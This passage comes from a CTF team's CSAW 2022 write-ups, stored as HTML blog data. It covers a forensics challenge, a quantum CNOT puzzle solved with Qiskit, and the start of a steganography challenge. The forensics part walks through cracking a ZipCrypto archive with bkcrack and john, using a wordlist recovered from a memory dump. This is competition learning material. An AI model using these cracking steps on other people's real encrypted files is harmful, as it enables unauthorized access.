class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output findme.txt --decrypt findme.txt.gpg <span class=\"comment\"># it will ask you for a password</span></span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> findme.txt</span><br><span class=\"line\">The flag is not here of course !!!</span><br><span class=\"line\">You must find it :-)</span><br><span class=\"line\">Troll one day troll always ........</span><br></pre></td></tr></table></figure>\n<p>Ah man ! I don’t find the flag! OK still the  <code>end.zip.gpg</code> ! Let’s find this, i guess it’s hiding in  <code>end.png</code>  image</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ sudo binwalk end.png </span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             PNG image, 850 x 300, 8-bit/color RGB, non-interlaced</span><br><span class=\"line\">320           0x140           Zlib compressed data, best compression</span><br><span class=\"line\">917           0x395           Zlib compressed data, best compression</span><br><span class=\"line\">493886        0x7893E         Zip archive data, at least v2.0 to extract, compressed size: 61917, uncompressed size: 61907, name: end.zip.gpg</span><br><span class=\"line\">555953        0x87BB1         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>\n<p>Finally we found it, let’s use  <code>foremost</code>  command to extract our target !</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ foremost end.png   </span><br><span class=\"line\">Processing: end.png</span><br><span class=\"line\">|foundat=end.zip.gpgUT</span><br><span class=\"line\">*|</span><br></pre></td></tr></table></figure>\n<p>A new directory called  <code>output</code>  is created and it contains the extracted files from  <code>end.png</code>  using</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ tree output</span><br><span class=\"line\">output</span><br><span class=\"line\">├── audit.txt</span><br><span class=\"line\">├── png</span><br><span class=\"line\">│   └── 00000000.png</span><br><span class=\"line\">└── zip</span><br><span class=\"line\">    └── 00000964.zip</span><br><span class=\"line\"></span><br><span class=\"line\">2 directories, 3 files</span><br></pre></td></tr></table></figure>\n<p>OK let’s unzip the  <code>00000964.zip</code>  file and decipher the  <code>end.zip.gpg</code>  file using  <code>Troll_Tr0ll_TrOll</code>  password and get our flag</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ unzip output/zip/00000964.zip </span><br><span class=\"line\">Archive:  output/zip/00000964.zip</span><br><span class=\"line\">  inflating: end.zip.gpg</span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output end.zip --decrypt end.zip.gpg</span><br></pre></td></tr></table></figure>\n<p>Ah finally there is a flag.gif file in end.zip file but wait!! the zip file is protected!</p>\n<p>We’ve noticed that the encryption is ZipCrypto Deflate which is similar to the other chall, crackable by just knowing 12 bytes of whats inside the zip, 8 of which must be contiguous.<br>\nWe’ve went ahead, used the header of a GIF file, and digging more into the GIF file structure, we’ve came to know that in most of the GIF files there is a constant text ‘NETSCAPE’ at the hexadecimal offset 0x310 which fulfills our needs, 8 bytes contiguous plus the header, we’ve got more than 12 bytes.</p>\n<p>The header is just  <code>GIF89a</code>  at offset 0x0.</p>\n<p><img data-src=\"https://i.imgur.com/RH9goSf.png\" alt=\"\"></p>\n<p>You can get bkcrack from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">here</span></p>\n<p>-C to specify the ciphered zip, -c for the target file -x to specify known bytes at some offset and -d to get the deciphered data once the process is done, and keys were found!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./bkcrack -C end.zip -c flag.gif -x 0 474946383961 -x 0x310 4E4554534415045322E30 -d deciphered</span><br></pre></td></tr></table></figure>\n<p>Unfortunately, it ended with  <code>Could Not find the keys.</code></p>\n<p>However we were not lucky to crack the zip open using bkcrack again.</p>\n<p>Don’t worry dude! we have rockyou and john! Let’s give bruteforcing a chance. We can extract the password hash with  <code>zip2john</code>  command!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ zip2john end.zip &gt; zip.hash  </span><br><span class=\"line\">ver 2.0 efh 5455 efh 7875 end.zip/flag.gif PKZIP Encr: TS_chk, cmplen=61563, decmplen=90082, crc=18A1C7A3 ts=8050 cs=8050 <span class=\"built_in\">type</span>=8</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to bruteforce the hash with rockyou!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ john --wordlist=<span class=\"variable\">$rockyou</span> zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">No password hashes left to crack (see FAQ)</span><br></pre></td></tr></table></figure>\n<p>Wait what??? The password wasn’t found on rockyou! What the hack?? After some investigating we remember that there is a text file called  <code>dic_fr_l33t.txt</code> ! dic means dictionary and fr means french right ? Oh man we need to recover this wordlist! But the user deleted it. I’ll give a chance to  <code>linux_find_file</code> . Let’s try to dump this text file. It might be stil loaded in the memory right?</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -L | grep dic_fr</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">3 0xffff88000c135cd8 /media/sf_DUMP/dir1/dic_fr_l33t.txt</span><br><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -i 0xffff88000c135cd8 -O dic_fr_l33t.txt</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br></pre></td></tr></table></figure>\n<p>Ah God! The extracted file is empty. We need another way to recover the wordlist and with an elegent way<br>\nAfter some minutes of thinking. We decide to use a regex that allow us to collect words that not contains special chars like  <code>&#123;_;&#125;/][-</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.raw | grep -v <span class=\"string\">&quot; \\|\\_\\|\\-\\|\\[\\|\\]\\|\\`\\|\\;\\|\\/\\|\\.\\|\\&#125;\\|\\&#123;&quot;</span> | <span class=\"built_in\">sort</span> | <span class=\"built_in\">uniq</span> | <span class=\"built_in\">sort</span> &gt; myrock.txt</span><br><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ sudo john --wordlist=~/myrock.txt zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">Will run 8 OpenMP threads</span><br><span class=\"line\">Press <span class=\"string\">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class=\"keyword\">for</span> status</span><br><span class=\"line\">Cyb3rs3curit3    (end.zip/flag.gif)</span><br><span class=\"line\">1g 0:00:00:00 DONE (2022-09-12 20:34) 6.666g/s 655360p/s 655360c/s 655360C/s Coup3ri3z..D3fouraillions</span><br><span class=\"line\">Use the <span class=\"string\">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n<p>Oh man we did it! The password of the protected  <code>end.zip</code>  is  <code>Cyb3rs3curit3</code>  (CyberSecurité).Let’s extract the  <code>flag.gif</code>  file now…</p>\n<p><img data-src=\"https://imgur.com/jZoDJhE.gif\" alt=\"\"><br>\nLet’s convert this gif to frames using  <code>ffmpeg</code>  utility, the magical one xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Split the gif</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ <span class=\"built_in\">mkdir</span> temp ; ffmpeg -i /mnt/dir2/flag.gif -vsync 0 temp/temp%d.png</span><br><span class=\"line\">Input <span class=\"comment\">#0, gif, from &#x27;flag.gif&#x27;:</span></span><br><span class=\"line\">  Duration: 00:00:03.60, start: 0.000000, bitrate: 200 kb/s</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: gif, bgra, 290x290, 10 fps, 10 tbr, 100 tbn</span></span><br><span class=\"line\">Stream mapping:</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0 -&gt; #0:0 (gif (native) -&gt; png (native))</span></span><br><span class=\"line\">Press [q] to stop, [?] <span class=\"keyword\">for</span> <span class=\"built_in\">help</span></span><br><span class=\"line\">Output <span class=\"comment\">#0, image2, to &#x27;temp/temp%d.png&#x27;:</span></span><br><span class=\"line\">  Metadata:</span><br><span class=\"line\">    encoder         : Lavf59.27.100</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: png, rgba(pc, gbr/unknown/unknown, progressive), 290x290, q=2-31, 200 kb/s, 10 fps, 10 tbn</span></span><br><span class=\"line\">    Metadata:</span><br><span class=\"line\">      encoder         : Lavc59.37.100 png</span><br><span class=\"line\">frame=   36 fps=0.0 q=-0.0 Lsize=N/A time=00:00:03.60 bitrate=N/A speed=14.8x</span><br><span class=\"line\">video:113kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown</span><br></pre></td></tr></table></figure>\n<p>We got this images! oh we have 36 QR Code images! Seriously i don’t want to scan it manually!<br>\n<img data-src=\"https://imgur.com/aFiEzTR.png\" alt=\"\"><br>\nLet’s Write a small code that reads all these QRcode images! I am too lazy man !</p>\n<figure class=\"highlight python\"><figcaption><span>Scan QRCode</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> cv2</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">36</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    img=cv2.imread(<span class=\"string\">&quot;temp&quot;</span>+<span class=\"built_in\">str</span>(i+<span class=\"number\">1</span>)+<span class=\"string\">&quot;.png&quot;</span>)</span><br><span class=\"line\">    det=cv2.QRCodeDetector()</span><br><span class=\"line\">    val, pts, st_code=det.detectAndDecode(img)</span><br><span class=\"line\">    flag+=val[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>Let’s run the code now ! I wish this nightmare finish dude! I don’t another step please</p>\n<figure class=\"highlight bash\"><figcaption><span>Run Reader</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ python3 temp/solve.py</span><br><span class=\"line\">The_flag_is:1_Lik3_F0r3nS1c_4nd_y0u?</span><br></pre></td></tr></table></figure>\n<p>And Finally we got the flag!</p>\n<h1 id=\"quantum-leap-misc\"><a class=\"markdownIt-Anchor\" href=\"#quantum-leap-misc\">#</a> Quantum Leap : Misc</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>My friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.</p>\n</div></details>\n<p>Challenge Link &amp; WriteUp Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Quantum Leap</p>\n          </div></div><div class=\"item\" title=\"Writeup Author - Mida0ui\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1668643200&v=beta&t=FV5YWMygs2bbclfvgFIUtPgjIedq8tGiKWxopxK2_yU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\">Writeup Author - Mida0ui</span>\n          <p class=\"desc\">Mida0ui Linkedin Profile</p>\n          </div></div></div>\n<p>The description mentions that we’re dealing with a quantum computer with two qubits, se we can assume that the gate the person used to get the output is a two-qubit quantum logic gate.</p>\n<p>A quantum gate is basic quantum circuit operating on a small number of qubits, they perform operations to change the state of the qubits, and unlike many classical logic gates, quantum logic gates are reversible.<br>\nEach quantum gate has its matrix, and since the qubit states are represented with vectors, the gates transform these vectors to get new states.<br>\nThe state vectors of the states |0&gt; and |1&gt; are:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190504993-8094b514-dfa2-472f-8622-59867ef2e061.png\" alt=\"2022-09-15_19h32_37\"></p>\n<p>The CNOT gate was applied, it’s a two-qubit quantum gate that performs a controlled NOT where one qubit is the control and the second qubit is the target.<br>\nIts matrix is the following :</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190486028-970479de-3ff1-415e-bdd2-b4f0e6c8dab2.png\" alt=\"2022-09-15_19h33_11\"></p>\n<p>When applied:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190497970-bd14060b-e413-43b6-982a-17da2d1c18a5.png\" alt=\"2022-09-15_20h47_02\"></p>\n<p>The mathematics behind these results are simple:</p>\n<p>Lets take |10&gt; and |11&gt;:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190505635-f998a0df-a328-4230-a3f1-1e3be73a5cef.png\" alt=\"2022-09-15_21h46_45\"></p>\n<p>This ⊗ represents a tensor product, you can read about it here if you don’t know what it is : <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWF0aDNtYS5jb20vYmxvZy90aGUtdGVuc29yLXByb2R1Y3QtZGVteXN0aWZpZWQ=\">https://www.math3ma.com/blog/the-tensor-product-demystified</span></p>\n<p>The first qubit is usually referred to as the control qubit and the second qubit as the target qubit. Expressed in basis states, the CNOT gate:<br>\nleaves the control qubit unchanged and performs a Pauli-X gate or NOT gate (which just flips the state of the qubit) on the target qubit when the control qubit is in state ∣1⟩;<br>\nleaves the target qubit unchanged when the control qubit is in state ∣0⟩.</p>\n<p>As you may have noticed, this challenge can be done manually by converting the output string to binary, taking two bits at a time and checking the value of the most significant bit, if it’s 1, the other bit is flipped, else, nothing is done.</p>\n<p>I wanted to solve this task with the CNOT gate itself,using the qiskit module in python.<br>\nQiskit is an open-source SDK for working with quantum computers at the level of pulses, circuits, and application modules.</p>\n<p>As mentioned before quantum logic gates are reversible, in this case, when CNOT gate is applied once on the output, we get the flag.</p>\n<p>Here’s the script, you can run it on jupyter notebook:</p>\n<figure class=\"highlight py\"><figcaption><span>Solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> qiskit <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">output = <span class=\"string\">&#x27;wxqvn$Zae$&#123;deyZv$d&quot;i&#x27;</span></span><br><span class=\"line\">output_array = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">format</span>(i, <span class=\"string\">&#x27;08b&#x27;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">bytearray</span>(output, encoding =<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">bin_flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">state_vect</span>(<span class=\"params\">bit</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(bit == <span class=\"string\">&#x27;0&#x27;</span>):</span><br><span class=\"line\">        vect = [<span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span> : </span><br><span class=\"line\">        vect = [<span class=\"number\">0</span> ,<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> vect</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(output_array):</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Initialize the quantum circuit</span></span><br><span class=\"line\">    q = QuantumRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;q&quot;</span>)</span><br><span class=\"line\">    c = ClassicalRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;c&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc = QuantumCircuit(q,c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#get the initial state from the output</span></span><br><span class=\"line\">    vect0 = state_vect(output_array[i])</span><br><span class=\"line\">    vect1 = state_vect(output_array[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#initialize the register</span></span><br><span class=\"line\">    qc.initialize(vect1,<span class=\"number\">0</span>)</span><br><span class=\"line\">    qc.initialize(vect0,<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#apply the CNOT gate, q[1] is the control and q[0] is the target</span></span><br><span class=\"line\">    qc.cx(q[<span class=\"number\">1</span>],q[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#execute the circuit</span></span><br><span class=\"line\">    qobj = assemble(qc, shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    job = execute(qc,Aer.get_backend(<span class=\"string\">&#x27;qasm_simulator&#x27;</span>),shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    counts = job.result().get_counts()</span><br><span class=\"line\">    </span><br><span class=\"line\">    bin_flag += <span class=\"built_in\">str</span>(counts)[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Increment the counter to get the next 2 qubits</span></span><br><span class=\"line\">    i=i+<span class=\"number\">2</span></span><br><span class=\"line\">    </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bin_flag[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>],<span class=\"number\">2</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bin_flag)//<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>The flag is  <code>flag&#123;4_qu4ntum_g4t3&#125;</code></p>\n","site":{"data":{}},"length":32776,"excerpt":"","more":"<p>CSAW CTF is one of the oldest and biggest CTFs in the world, with more than 900 teams participating in the 2022 edition. We would like to thank the organizers for the stable infrastructure and the creative challenges.</p>\n<p>we finished first in the MENA region and 14th globally</p>\n<p>Kudos to everyone in my team SOter14 for their huge work and efforts, you can catch up with out latest news at <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3RlcjE0LnRlY2g=\">our website</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TT3RlcjE0VGVhbQ==\">twitter page</span></p>\n<p>The contest was fun and challenging, we managed to solve 25 out of the 28 challenges in Pwn, Web, OSINT, Forensics, Steganography, Misc, Quantum Computing, AI, Cryptography, and Reverse Engineering.</p>\n<p>Below are the writeups for forensics challs: Noir, Not Too Taxing (Crypto), and Encrypted disk.</p>\n<h1 id=\"noir-digital-forensics-steganography\"><a class=\"markdownIt-Anchor\" href=\"#noir-digital-forensics-steganography\">#</a> Noir: Digital Forensics / Steganography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>I am a forest, and a night of dark trees: but he who is not afraid of my darkness, will find banks full of roses under my cypresses. Friedrich Nietzsche.</p>\n<p>The image contains a flag in the format (flag)this_is_the_flag</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Noir</p>\n          </div></div><div class=\"item\" title=\"Author - Wen Jun L.\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C5603AQGZdulNxGshvg/profile-displayphoto-shrink_400_400/0/1602081502952?e=1668643200&v=beta&t=XeXg__QTpf__BhQHFkZD7sSsL7PeCEbEXdi-J66JfeU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\">Author - Wen Jun L.</span>\n          <p class=\"desc\">Wen Jun L. Linkedin Profile</p>\n          </div></div></div>\n<p>This challenge blowed our minds, it was part of CSAW’21 Finals and it is a 0-solves chall, so it was offered in the Quals of 2022. We’ve got an image, bit heavy around 9 MB that looks like a scene from a horror game, storm, forest, and darkness. It was a twisted chall!</p>\n<p><img data-src=\"https://github.com/u91o/noir/blob/main/noir.png?raw=true\" alt=\"\"></p>\n<p>First, we tried the normal steganogrpahy ways around it, but obviously that is a total waster of time.</p>\n<p>It had 100+ on Aperisolve alone!</p>\n<p>Technically, the image is merely noise in the three RGB channels whith contrast on few areas, that when included with the alpha channel gives the image as you see it! Amazing, it really feels like some streaming technique, a kind of standard that’s used by TVs to show pictures we can understand. But we neglected the thought of getting a video out of an image, how unfair! Instead we’ve thought of the noise as a raw data that we can feed to Audacity and hopefully get an audible thing out of it, using U-LAW since we’re dealing with RAW data, it made much sense, because we have seen some images filled with noise turning into audio. But a video, insane!</p>\n<p><img data-src=\"https://i.imgur.com/dpalAg1.png\" alt=\"\"></p>\n<p>And of course, it was a video!</p>\n<p>Noir represents a kind of movies, black and white, crime generally, and that’s how we finally went into the idea that we’re dealing with a video rather than an audio.</p>\n<p>The Noir movies are taped to a stripe and played through a wheel showing still images 24 frames a second - Oh, keep that in mind! Still images mean also RAW data. That could help.</p>\n<p>But still we wonder, how to extract the video.<br>\nWell it can’t be manually, there must be a tool, or it would be a total nightmare.</p>\n<p>To save you some time, it was  <code>FFmpeg</code> !!</p>\n<p>FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the command-line ffmpeg tool itself, designed for processing of audiovisual files. Per Wikipedia.</p>\n<p>Well, that means some sort of conversion, right? Yep, but from a single png to what? There are hundreds of video formats out there, some of them are no longer being used.</p>\n<p>But we can narrow our results, to lightweight ones since the image is just 9 MB, 24 fps if that helps, RAW data, so no codecs!</p>\n<p>FFmpeg command to convert formats is basically:</p>\n<figure class=\"highlight bash\"><figcaption><span>ffmpeg command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i <span class=\"built_in\">source</span> -pix_fmt pixelformat  -f rawvideo - &gt; output.extension</span><br></pre></td></tr></table></figure>\n<p>You can specify the frames, although ffmpeg can pretty much detect that automatically.</p>\n<p>We need the pixelformat and the extension. We’re getting close!</p>\n<p>Hmm, since we’re dealing with an image, can’t the extension of the video we’re looking for be both an image extension and a video extension. WEBM answers that. How 